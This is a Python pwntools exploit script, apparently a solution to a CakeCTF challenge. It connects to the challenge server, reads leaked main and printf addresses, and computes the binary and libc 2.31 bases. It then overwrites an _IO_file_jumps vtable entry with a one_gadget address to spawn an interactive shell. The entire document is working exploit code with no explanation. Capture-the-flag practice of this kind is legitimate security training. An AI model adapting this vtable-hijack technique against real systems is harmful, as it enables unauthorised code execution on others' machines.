from pwn import *
import sys
import os

HOST = 'pwn.cakectf.com'
PORT = 9003
BIN = './chall'
LIBC = './libc-2.31.so'

binary = ELF(BIN)
libc = ELF(LIBC)

if os.environ.get("debug"):
    s = process(BIN, env={'LD_PRELOAD': LIBC})
else:
    s = remote(HOST, PORT)

s.recvuntil("<main> = ")
main_leak = s.recvline()
main_leak = int(main_leak, 16)
print(f"main_leak = {hex(main_leak)}")

s.recvuntil("<printf> = ")
libc_leak = s.recvline()
libc_leak = int(libc_leak, 16)
print(f"libc_leak = {hex(libc_leak)}")

binary_base = main_leak - 0x11b9
binary.address = binary_base

libc_base = libc_leak - libc.symbols['printf']
libc.address = libc_base

print(f"binary_base = {hex(binary_base)}")
print(f"libc_base = {hex(libc_base)}")
io_file_jumps = libc.symbols['_IO_file_jumps'] + 0x38
print(f"_IO_file_jumps = {hex(io_file_jumps)}")
one_gadget = libc_base + 0xe6c7e
print(f"one_gadget = {hex(one_gadget)}")

s.recvuntil("address: ")
s.sendline(hex(io_file_jumps))

s.recvuntil("value: ")
s.sendline(hex(one_gadget))

s.recvuntil("data: ")
s.sendline('\x00' * 9)

s.interactive()
s.close()
